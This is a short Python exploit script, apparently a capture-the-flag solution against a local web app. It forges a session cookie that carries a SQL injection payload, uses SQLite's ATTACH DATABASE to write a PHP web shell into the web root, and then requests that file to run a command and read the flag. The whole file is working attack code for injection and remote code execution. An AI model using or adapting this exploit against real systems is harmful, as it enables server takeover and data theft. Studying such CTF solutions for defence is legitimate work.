import requests
import urllib
import re

URL_BASE = "http://localhost:8888/"
counter = 0
while True:
    counter += 1
    payload = "'test'; ATTACH DATABASE '/var/www/html/data/lol-abcdefg.php' AS lol; CREATE TABLE lol.pwn (dataz test); INSERT INTO lol.pwn (dataz) VALUES ('<?php system(''/readflag'') ?>'); -- "+str(counter)
    
    # Replace this with your null HMAC, can obtain with null_hmac.py
    null_hmac = "PUT UR NULL HMAC HERE"
    
    quoted = urllib.parse.quote(f"{payload}|{null_hmac}")

    cookies = {
        "csrftoken": "5zrb4QghIwlna4nIEXrsmlzGhgtyekKY6XrucARpSLLHAmJAa35I6Uyp1sCGhsxX",
        "session": quoted
    }

    res = requests.post(URL_BASE, cookies=cookies, data={"content": "cool post!"})
    data = res.content
    post_id = re.search('\<input type="hidden" name="delete" value="([0-9]*)"\>', data.decode())
    if post_id is None:
        print("FAIL")
        continue
    post_id = post_id.group(1)
    print(f"Post id: {post_id}")

    requests.post(URL_BASE, cookies=cookies, data={"delete": f"{post_id}"})
    flag = requests.get(URL_BASE+"data/lol-abcdefg.php").content

    flag = flag[flag.index(b"hxp"):]
    print(flag)
    break